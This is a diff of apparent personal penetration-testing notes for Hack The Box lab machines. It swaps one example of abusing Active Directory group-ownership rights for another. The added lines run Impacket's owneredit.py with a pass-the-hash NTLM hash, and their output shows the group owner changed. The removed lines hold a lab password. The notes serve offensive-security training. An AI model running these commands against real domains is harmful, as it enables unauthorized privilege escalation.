@@ -1,25 +1,21 @@
 ### Group
 
-The user JUDITH.MADER@CERTIFIED.HTB has the ability to modify the owner of the group MANAGEMENT@CERTIFIED.HTB.
+The computer HAZE-IT-BACKUP$@HAZE.HTB has the ability to modify the owner of the group SUPPORT_SERVICES@HAZE.HTB.
 
 Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.
 
-![[Pasted image 20241105010915.png]]
+![[Pasted image 20250619201621.png]]
 
 ```bash
-owneredit.py -action write -owner 'judith.mader' -target 'judith.mader' 'certified.htb'/'judith.mader':'judith09'
-```
-
- ```bash
-owneredit.py -action write -new-owner 'judith.mader' -target 'judith.mader' 'certified.htb'/'judith.mader':'judith09'
+garffff@garffff:~$ owneredit.py 'haze.htb/haze-IT-backup$' -hashes :4de830d1d58c14e241aff55f82ecdba1 -action write -new-owner 'haze-IT-backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' 
 
 Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs
 
 [*] Current owner information below
-[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
+[*] - SID: S-1-5-21-323145914-28650650-2368316563-512
 [*] - sAMAccountName: Domain Admins
-[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
-[-] Could not modify object, the server reports insufficient rights: 00000005: SecErr: DSID-03152E13, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=haze,DC=htb
+[*] OwnerSid modified successfully!
 ```
 
 ### LDAP_Shell
